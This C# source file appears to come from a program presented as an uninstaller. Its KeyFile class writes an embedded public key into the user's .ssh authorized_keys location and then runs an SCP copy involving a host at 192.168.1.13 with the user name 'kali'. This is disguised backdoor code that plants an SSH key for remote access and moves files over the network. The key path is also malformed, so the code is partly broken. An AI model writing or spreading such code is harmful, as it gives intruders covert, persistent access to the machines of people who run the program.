using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Reflection;

namespace UninstallProgram.Functions
{
    internal class KeyFile
    {
        public KeyFile() { }

        public KeyFile(string key) { }

        public void doAll()
        {
            // Lấy namespace của class chứa mã nguồn
            string currentNamespace = typeof(Program).Namespace;

            // Đường dẫn tương đối của tệp tin nhúng
            string relativePath = "Resources.Key.id_rsa.pub";

            // Xây dựng tên tệp tin nhúng
            string resourceName = $"{currentNamespace}.{relativePath}";

            // Lấy đường dẫn của thư mục người dùng
            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Đường dẫn đích
            string destinationPath = Path.Combine(userDirectory, @".ssh\authorized_keys\id_rsa");

            // Copy nội dung từ tệp tin nhúng ra tệp tin đích
            CopyEmbeddedResourceToFile(resourceName, destinationPath);

            //Console.WriteLine($"File copied to: {destinationPath}");
            //Console.WriteLine($"UserDirectory: {userDirectory}");
            //Console.WriteLine($"resourceName: {resourceName}");

            //ip minh - name minh - duong dan tren may IT...\id_rsa, copy khoa vao duong dan - @"D:\makecookie": ten file muon copy tu IT qua may minh

            new Scp("192.168.1.13", "kali").Copy(destinationPath, @"D:\makecookie");
        }

        // Phương thức copy nội dung của tệp tin nhúng ra tệp tin
        static void CopyEmbeddedResourceToFile(string resourceName, string destinationPath)
        {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null)
                {
                    throw new InvalidOperationException($"Resource '{resourceName}' not found.");
                }

                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(destinationPath))
                {
                    writer.Write(reader.ReadToEnd());
                }
            }
        }
    }

}
